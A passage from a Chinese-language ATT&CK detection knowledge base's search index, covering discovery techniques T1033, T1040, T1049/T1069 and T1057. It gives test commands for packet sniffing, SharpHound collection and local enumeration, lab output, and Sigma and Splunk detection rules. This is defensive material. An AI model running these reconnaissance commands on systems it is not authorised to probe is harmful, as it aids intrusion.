<pre><code>logsource:\n    product: linux\n    service: history\ndetection:\n    keywords:\n       - w\n       - who\n       - users\n    condition: keywords\nlevel: low\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1033</p> <p>https://attack.mitre.org/techniques/T1033/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/","title":"T1040-linux-\u7f51\u7edc\u55c5\u63a2","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u7f51\u7edc\u55c5\u63a2\u662f\u6307\u4f7f\u7528\u7cfb\u7edf\u4e0a\u7684\u7f51\u7edc\u63a5\u53e3\u6765\u76d1\u89c6\u6216\u6355\u83b7\u901a\u8fc7\u6709\u7ebf\u6216\u65e0\u7ebf\u8fde\u63a5\u53d1\u9001\u7684\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u7f51\u7edc\u63a5\u53e3\u7f6e\u4e8e\u6df7\u6742\u6a21\u5f0f\u4ee5\u901a\u8fc7\u7f51\u7edc\u88ab\u52a8\u5730\u8bbf\u95ee\u4f20\u8f93\u4e2d\u7684\u6570\u636e\uff0c\u6216\u8005\u4f7f\u7528\u8de8\u63a5\u7aef\u53e3\u6765\u6355\u83b7\u66f4\u5927\u91cf\u7684\u6570\u636e\u3002</p> <p>\u901a\u8fc7\u8be5\u6280\u672f\u53ef\u4ee5\u6355\u83b7\u7684\u6570\u636e\u5305\u62ec\u7528\u6237\u51ed\u8bc1\uff0c\u5c24\u5176\u662f\u901a\u8fc7\u4e0d\u5b89\u5168\u7684\u672a\u52a0\u5bc6\u534f\u8bae\u53d1\u9001\u7684\u51ed\u8bc1\uff1b\u7f51\u7edc\u55c5\u63a2\u8fd8\u53ef\u4ee5\u83b7\u53d6\u5230\u914d\u7f6e\u7ec6\u8282\uff0c\u4f8b\u5982\u8fd0\u884c\u670d\u52a1\uff0c\u7248\u672c\u53f7\u4ee5\u53ca\u540e\u7eed\u6a2a\u5411\u79fb\u52a8\u548c/\u6216\u9632\u5fa1\u9003\u907f\u6d3b\u52a8\u6240\u9700\u7684\u5176\u4ed6\u7f51\u7edc\u7279\u5f81\uff08\u4f8b\u5982\uff1aIP\u5bfb\u5740\uff0c\u4e3b\u673a\u540d\uff0cVLAN ID\uff09\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>tcpdump -c 5 -nnni #{\u7f51\u5361\u63a5\u53e3}</p> <p>tshark -c 5 -i #{\u7f51\u5361\u63a5\u53e3}</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux /var/log/message \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u4e0b\u9ed8\u8ba4\u4e0d\u5f00\u542fmessage\u65e5\u5fd7\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\uff09</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_4","title":"\u573a\u666f\u4e00","text":"<p>root@icbc:~# tcpdump -c 5 -nnni ens33 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes 10:37:34.347544 IP 192.168.66.1.60886 &gt; 239.255.255.250.1900: UDP, length 137 10:37:37.355725 IP 192.168.66.1.60886 &gt; 239.255.255.250.1900: UDP, length 137 10:37:40.356238 IP 192.168.66.1.60886 &gt; 239.255.255.250.1900: UDP, length 137 10:37:43.356969 IP 192.168.66.1.60886 &gt; 239.255.255.250.1900: UDP, length 137 10:37:49.808569 IP 192.168.66.148.59150 &gt; 192.168.66.2.53: 15476+ [1au] A? connectivity-check.ubuntu.com. (58) 5 packets captured 5 packets received by filter 0 packets dropped by kernel</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_5","title":"\u573a\u666f\u4e8c","text":"<p>root@icbc:~# tshark -c 5 -i ens33 Running as user \"root\" and group \"root\". This could be dangerous. Capturing on 'ens33'     1 0.000000000 192.168.66.148 \u2192 192.168.66.2 DNS 100 Standard query 0xe349 A connectivity-check.ubuntu.com OPT     2 0.038532840 Vmware_e8:11:b3 \u2192 Broadcast    ARP 60 Who has 192.168.66.148? Tell 192.168.66.2     3 0.038552195 Vmware_02:d5:c7 \u2192 Vmware_e8:11:b3 ARP 42 192.168.66.148 is at 00:0c:29:02:d5:c7     4 0.038758293 192.168.66.2 \u2192 192.168.66.148 DNS 132 Standard query response 0xe349 A connectivity-check.ubuntu.com A 35.224.99.156 A 35.222.85.5 OPT     5 0.039670671 192.168.66.148 \u2192 35.222.85.5  TCP 74 57812 \u2192 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=136575048 TSecr=0 WS=128 5 packets captured</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#1","title":"\u573a\u666f1","text":"<p>message\u65e5\u5fd7</p> <p>Jul 19 10:37:33 icbc kernel: [  298.396406] device ens33 entered promiscuous mode</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#2","title":"\u573a\u666f2","text":"<p>message\u65e5\u5fd7</p> <p>Jul 19 10:47:42 icbc systemd[1]: Started Cleanup of Temporary Directories. Jul 19 10:47:50 icbc kernel: [  915.199848] device ens33 left promiscuous mode Jul 19 10:47:50 icbc start.sh[734]: 2019-07-19 10:47:50,165: DEBUG helpers.application.health RAM: 65MB</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#splunk","title":"splunk\u68c0\u6d4b\u89c4\u5219","text":"<p>index=linux sourcetype=syslog entered promiscuous mode | table host,message</p> <p>index=linux sourcetype=syslog left promiscuous mode | table host,message</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_8","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1040</p> <p>https://attack.mitre.org/techniques/T1040/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/","title":"T1049/1069-bloodhound\u4f7f\u7528","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>T1049:\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u67e5\u8be2\u7f51\u7edc\u4e0a\u7684\u4fe1\u606f\u6765\u5c1d\u8bd5\u83b7\u53d6\u4e0e\u4ed6\u4eec\u5f53\u524d\u6b63\u5728\u8bbf\u95ee\u7684\u53d7\u611f\u67d3\u7cfb\u7edf\u4e4b\u95f4\u6216\u4ece\u8fdc\u7a0b\u7cfb\u7edf\u83b7\u5f97\u7684\u7f51\u7edc\u8fde\u63a5\u7684\u5217\u8868\u3002 T1069:\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u67e5\u627e\u672c\u5730\u7cfb\u7edf\u6216\u57df\u7ea7\u522b\u7684\u7ec4\u548c\u6743\u9650\u8bbe\u7f6e\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>BloodHound\u662f\u4e00\u79cd\u5355\u9875\u7684JavaScript\u7684Web\u5e94\u7528\u7a0b\u5e8f\uff0c\u6784\u5efa\u5728Linkurious\u4e0a\uff0c\u7528Electron\u7f16\u8bd1\uff0cNEO4J\u6570\u636e\u5e93\u662fPowerShell/C# ingestor. BloodHound\u4f7f\u7528\u53ef\u89c6\u5316\u56fe\u6765\u663e\u793aActive Directory\u73af\u5883\u4e2d\u9690\u85cf\u7684\u548c\u76f8\u5173\u8054\u7684\u4e3b\u673a\u5185\u5bb9\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528BloodHound\u8f7b\u677e\u8bc6\u522b\u9ad8\u5ea6\u590d\u6742\u7684\u653b\u51fb\u8def\u5f84\uff0c\u5426\u5219\u5f88\u96be\u5feb\u901f\u8bc6\u522b\u3002\u9632\u5fa1\u8005\u53ef\u4ee5\u4f7f\u7528BloodHound\u6765\u8bc6\u522b\u548c\u9632\u5fa1\u90a3\u4e9b\u76f8\u540c\u7684\u653b\u51fb\u8def\u5f84\u3002\u84dd\u961f\u548c\u7ea2\u961f\u90fd\u53ef\u4ee5\u4f7f\u7528BloodHound\u8f7b\u677e\u6df1\u5165\u4e86\u89e3Active Directory\u73af\u5883\u4e2d\u7684\u6743\u9650\u5173\u7cfb\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code> SharpHound.exe -c ALL\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u65e5\u5fd7\u30015145</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Bloodhound and Sharphound Hack Tool\ndescription: Detects command line parameters used by Bloodhound and Sharphound hack tools\nreferences:\n    - https://github.com/BloodHoundAD/BloodHound\n    - https://github.com/BloodHoundAD/SharpHound\ntags:\n    - attack.discovery\n    - attack.t1049\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1: \n        Image|contains: \n            - '\\Bloodhound.exe'\n            - '\\SharpHound.exe'\n    selection2:\n        CommandLine|contains: \n            - ' -CollectionMethod All '\n            - '.exe -c All -d '\n            - 'Invoke-Bloodhound'\n            - 'Get-BloodHoundData'\n    selection3:\n        CommandLine|contains|all: \n            - ' -JsonFolder '\n            - ' -ZipFileName '\n    selection4:\n        CommandLine|contains|all: \n            - ' DCOnly '\n            - ' --NoSaveCache '\n    condition: 1 of them\nfalsepositives:\n    - Other programs that use these command line option and accepts an 'All' parameter\nlevel: high\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_6","title":"\u5efa\u8bae","text":"<p>\u57fa\u4e8e\u8fdb\u7a0b\u547d\u4ee4\u540d\u79f0\u8fdb\u884c\u68c0\u6d4b\uff0c\u51c6\u786e\u7387\u6781\u4f4e\uff0c\u8c28\u614e\u4f7f\u7528\u68c0\u6d4b\u6761\u4ef61.</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1049</p> <p>https://attack.mitre.org/techniques/T1049/</p> <p>MITRE-ATT&amp;CK-T1069</p> <p>https://attack.mitre.org/techniques/T1069/</p> <p>bloodhound</p> <p>https://github.com/BloodHoundAD/BloodHound</p> <p>\u57df\u5206\u6790\u795e\u5668</p> <p>https://www.cnblogs.com/KevinGeorge/p/10513211.html</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/","title":"T1049-\u7cfb\u7edf\u7f51\u7edc\u8fde\u63a5\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u67e5\u8be2\u7f51\u7edc\u4e0a\u7684\u4fe1\u606f\u6765\u5c1d\u8bd5\u83b7\u53d6\u4e0e\u4ed6\u4eec\u5f53\u524d\u6b63\u5728\u8bbf\u95ee\u7684\u53d7\u611f\u67d3\u7cfb\u7edf\u4e4b\u95f4\u6216\u4ece\u8fdc\u7a0b\u7cfb\u7edf\u83b7\u5f97\u7684\u7f51\u7edc\u8fde\u63a5\u7684\u5217\u8868\u3002</p> <p>\u83b7\u5f97\u5bf9\u57fa\u4e8e\u4e91\u73af\u5883\u4e00\u90e8\u5206\u7684\u7cfb\u7edf\u7684\u8bbf\u95ee\u6743\u7684\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u89c4\u5212\u51fa\u865a\u62df\u79c1\u6709\u4e91\u6216\u865a\u62df\u7f51\u7edc\uff0c\u4ee5\u4fbf\u786e\u5b9a\u8fde\u63a5\u4e86\u54ea\u4e9b\u7cfb\u7edf\u548c\u670d\u52a1\u3002\u53d6\u51b3\u4e8e\u64cd\u4f5c\u7cfb\u7edf\uff0c\u6240\u6267\u884c\u7684\u64cd\u4f5c\u53ef\u80fd\u662f\u76f8\u540c\u7c7b\u578b\u7684\u53d1\u73b0\u6280\u672f\uff0c\u4f46\u662f\u6240\u5f97\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u6709\u5173\u4e0e\u653b\u51fb\u8005\u76ee\u6807\u76f8\u5173\u7684\u8054\u7f51\u4e91\u73af\u5883\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u4e91\u63d0\u4f9b\u5546\u53ef\u80fd\u5177\u6709\u4e0d\u540c\u7684\u865a\u62df\u7f51\u7edc\u64cd\u4f5c\u65b9\u5f0f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#windows","title":"windows","text":"<p>\u83b7\u53d6\u6b64\u4fe1\u606f\u7684\u5b9e\u7528\u7a0b\u5e8f\u548c\u547d\u4ee4\u5305\u62ecnetstat\uff0c\u201cnet use\u201d\u548c\u4e0e\u201cnet session\u201d\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#maclinux","title":"Mac\u548clinux","text":"<p>\u5728Mac\u548cLinux\uff0cnetstat\u5e76\u4e14lsof\u53ef\u4ee5\u7528\u6765\u5217\u8868\u5f53\u524d\u8fde\u63a5\u3002who -a\u5e76\u4e14w\u53ef\u4ee5\u7528\u6765\u663e\u793a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u7c7b\u4f3c\u4e8e\u201c\u7f51\u7edc\u4f1a\u8bdd\u201d\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p> <p>linux\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Users\\Administrator&gt;netstat\n\n\u6d3b\u52a8\u8fde\u63a5\n\n  \u534f\u8bae  \u672c\u5730\u5730\u5740          \u5916\u90e8\u5730\u5740        \u72b6\u6001\n</code></pre> <pre><code>C:\\Users\\Administrator&gt;net use\n\u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002\n\n\u5217\u8868\u662f\u7a7a\u7684\u3002\n</code></pre> <pre><code>C:\\Users\\Administrator&gt;net session\n\u5217\u8868\u662f\u7a7a\u7684\u3002\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p> <p>linux\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: windows \u7cfb\u7edf\u7f51\u7edc\u94fe\u63a5\u53d1\u73b0\ndescription: windows server 2016\nreferences:\n      - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1049/T1049.md\ntags: T1049\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security/sysmon\ndetection:\n    selection1:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Commandline: \n                - netstat\n                - net use\n                - net sessions\n    selection2: \n        keywords:   \n                - Get-NetTCPConnection #powershell\n    condition: all of them\nlevel: medium\n</code></pre> <pre><code>title: linux\u7f51\u7edc\u4fe1\u606f\u53d1\u73b0\ndescription: ubuntu 18.0.4\nreferences:\n      - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1049/T1049.md\ntags: T1049\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n       keywords:\n               - netstat\n               - who -a\n    condition: all of them\nlevel: medium\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1049</p> <p>https://attack.mitre.org/techniques/T1222/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/","title":"T1057-win-\u8fdb\u7a0b\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u83b7\u53d6\u6709\u5173\u5728\u7cfb\u7edf\u4e0a\u8fd0\u884c\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002\u83b7\u5f97\u7684\u4fe1\u606f\u53ef\u7528\u4e8e\u4e86\u89e3\u7f51\u7edc\u5185\u7cfb\u7edf\u4e0a\u8fd0\u884c\u7684\u901a\u7528\u8f6f\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u6765\u81ea\u8fc7\u7a0b\u53d1\u73b0\u7684\u4fe1\u606f\u6765\u5851\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u548c/\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002</p> <p>windows \u4f7f\u7528tasklist\u5b9e\u7528\u7a0b\u5e8f\u83b7\u5f97\u8fdb\u7a0b\u8be6\u7ec6\u4fe1\u606f\u7684\u793a\u4f8b\u547d\u4ee4\u662f\u201ctasklist\u201d\u3002</p> <p>Mac\u548cLinux \u5728Mac\u548cLinux\u4e2d\uff0c\u8fd9\u662f\u901a\u8fc7ps\u547d\u4ee4\u5b8c\u6210\u7684\u3002</p> <p>\u7c7b\u4f3c\u4e8eT1603-win-\u5b89\u5168\u8f6f\u4ef6\u53d1\u73b0\uff0c\u5177\u4f53\u6d4b\u8bd5\u6848\u4f8b\u53ca\u8be6\u7ec6\u4fe1\u606f\u53ef\u53c2\u8003T1063\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>windows\u672c\u5730\u6267\u884cTasklist</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p> <p>linux\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u65e5\u5fd7\u3001\u5b50\u7236\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff08windows server 2016\uff09</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#sigma-win","title":"sigma-win\u89c4\u5219","text":"<pre><code>title: windows\u672c\u5730\u6267\u884cTasklist\ndescription: windows server 2016\nreferences: \n      - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1057/T1057.md\ntags: T1057\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa\n        Newprocessname: 'C:\\windows\\system32\\tasklist.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: tasklist  #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    condition: selection\nlevel: low\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#sigma-linux","title":"sigma-linux\u89c4\u5219","text":"<pre><code>title: linux\u672c\u5730\u8fdb\u7a0b\u53d1\u73b0\ndescription: linux ps\u547d\u4ee4\u5b9e\u73b0\u672c\u5730\u8fdb\u7a0b\u53d1\u73b0\nreferences: \n      - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1057/T1057.md\ntags: T1057\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: linux\ndetection:\n    selection:\n        keywords: \n               - ps\n               - ps aux\n    condition: selection\nlevel: low\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u53ef\u4ee5\u6839\u636e\u5b50\u7236\u8fdb\u7a0b\u4ee5\u53ca\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\uff0c\u4f46\u662f\uff0c\u591a\u6570\u60c5\u51b5\u4e0b\u67d0\u4e9b\u547d\u4ee4\u6b63\u5e38\u7ba1\u7406\u5458\u4e5f\u4f1a\u53bb\u7528\uff0c\u6240\u4ee5\u9700\u8981\u6839\u636e\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790\uff0c\u6392\u9664\u8bef\u62a5\u3002</p> <p>\u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u770b\u8d77\u6765\u50cf\u8fdb\u7a0b\u53d1\u73b0\u7684\u6b63\u5e38\u3001\u826f\u6027\u7684\u7cfb\u7edf\u548c\u7f51\u7edc\u4e8b\u4ef6\u53ef\u80fd\u5e76\u4e0d\u5e38\u89c1\uff0c\u8fd9\u53d6\u51b3\u4e8e\u73af\u5883\u548c\u5b83\u4eec\u7684\u4f7f\u7528\u65b9\u5f0f\u3002\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows 